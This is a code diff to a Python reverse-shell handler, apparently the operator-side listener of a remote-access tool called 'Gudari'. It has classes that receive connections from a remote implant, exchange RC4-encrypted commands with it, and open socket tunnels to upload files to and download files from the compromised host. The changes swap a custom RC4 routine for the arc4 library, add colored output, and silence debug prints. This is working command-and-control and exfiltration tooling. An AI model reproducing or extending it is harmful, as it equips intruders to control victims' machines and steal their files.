@@ -4,20 +4,29 @@ import sys
 import time, select
 from rc4 import *
 import struct
+from arc4 import ARC4
+
+OKBLUE = '\033[94m'
+OKGREEN = '\033[92m'
+WARNING = '\033[93m'
+FAIL = '\033[91m'
+ENDC = '\033[0m'
+BOLD = '\033[1m'
+UNDERLINE = '\033[4m'
 
 #Class for standarize messages
 class Msg:
     def info(m):
-        print("[*] {0:s}".format(str(m)))
+        print("\033[94m[*] {0:s}\033[0m".format(str(m)))
 
     def err(m):
-        print("[-] {0:s}".format(str(m)))
+        print("\033[91m[-] {0:s}\033[0m".format(str(m)))
 
     def warn(m):
-        print("[!] {0:s}".format(str(m)))
+        print("\033[93m[!] {0:s}\033[0m".format(str(m)))
 
     def ok(m):
-        print("[+] {0:s}".format(str(m)))
+        print("\033[92m[+] {0:s}\033[0m".format(str(m)))
 
     def dbg(m):
         print("dbg >>> {0:s}".format(str(m)))
@@ -196,11 +205,11 @@ class RevHandlerRC4:
                 if not data:
                     Msg.err("Port: {0:d} Session terminated".format(self.LPORT))
                     return
-                print(data[:2])
+                #print(data[:2])
                 receiveSize = struct.unpack("<H",data[:2])[0]
                 data = s.recv(receiveSize)
                 if receiveSize != 1:
-                    print("Recibiendo {} \m".format(receiveSize))
+                    #print("Recibiendo {} \m".format(receiveSize))
                     plaintext = rc4Decrypt(data, bytes(str(self.password), 'utf-8'))
                     if "Response End" in plaintext.encode("utf-8").decode('utf-8'):
                         #print("Fin de respuesta")
@@ -216,15 +225,15 @@ class RevHandlerRC4:
             return            
 
     def sktSend(self, data):     
-        cifrado = RC4Encrypt(self.password, data)
-        #print(str(rawbytes(cifrado)))
-        rawBytes = rawbytes(cifrado)
-        i = rawBytes.find(b'\x00')
-        while i != -1:
-            print("Encontrado: "+str(i))
-            rawBytes = rawBytes[:i]+rawBytes[i+1:]
-            i = rawBytes.find(b'\x00')
-        self.sock.send(struct.pack("<H", len(data))+rawBytes)
+        #cifrado = RC4Encrypt(self.password, data)
+        arc4 = ARC4(self.password)
+        #rawBytes = rawbytes(cifrado)
+        #i = rawBytes.find(b'\x00')
+        #while i != -1:
+        #    print("Encontrado: "+str(i))
+        #    rawBytes = rawBytes[:i]+rawBytes[i+1:]
+        #    i = rawBytes.find(b'\x00')
+        self.sock.send(struct.pack("<H", len(data))+arc4.encrypt(data))
         self.busy=True
 
     def connect(self):
@@ -309,7 +318,7 @@ class GudariHandler(RevHandler):
             f.close()
             skt.shutdown(socket.SHUT_RDWR)
             skt.close()
-            Msg.ok("File uploaded")
+            #Msg.ok("File uploaded")
         except Exception as e:
             Msg.err("Error uploading the file")
             Msg.err(e)
@@ -327,7 +336,7 @@ class GudariHandler(RevHandler):
             f.close()
             skt.shutdown(socket.SHUT_RDWR)
             skt.close()
-            Msg.ok("File downloaded")
+            #Msg.ok("File downloaded")
         except:
             Msg.err("Error downloading the file")
             Msg.err(e)
@@ -338,7 +347,7 @@ class GudariHandler(RevHandler):
             fileEngine = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             fileEngine.bind((lhost,int(trport)))
             #Send the required command through the socket
-            self.sktSend(self, "DOWNLOAD {0:s} {1:s} {2:s}".format(lhost, trport, fname).encode())
+            self.sktSend("DOWNLOAD {0:s} {1:s} {2:s}".format(lhost, trport, fname))
             fileEngine.listen(1)
             sdwn, addrFileEngine = fileEngine.accept()
             Msg.ok("File transfer tunnel estableshed with "+str(addrFileEngine))
@@ -367,7 +376,7 @@ class GudariHandler(RevHandler):
             Msg.dbg(filename)
             Msg.dbg(rfile)        
             # upload tunnel command
-            self.sock.send("UPLOAD {0:s} {1:s} {2:s}".format(lhost, trport, rfile).encode())
+            self.sktSend("UPLOAD {0:s} {1:s} {2:s}".format(lhost, trport, rfile))
             fileEngine.listen(1)
             supl, addrFileEngine = fileEngine.accept()
             Msg.ok("File transfer tunnel established with "+str(addrFileEngine))
@@ -428,7 +437,7 @@ class GudariRC4Handler(RevHandlerRC4):
             f.close()
             skt.shutdown(socket.SHUT_RDWR)
             skt.close()
-            Msg.ok("File uploaded")
+            #Msg.ok("File uploaded")
         except Exception as e:
             Msg.err("Error uploading the file")
             Msg.err(e)
@@ -446,7 +455,7 @@ class GudariRC4Handler(RevHandlerRC4):
             f.close()
             skt.shutdown(socket.SHUT_RDWR)
             skt.close()
-            Msg.ok("File downloaded")
+            #Msg.ok("File downloaded")
         except:
             Msg.err("Error downloading the file")
             Msg.err(e)
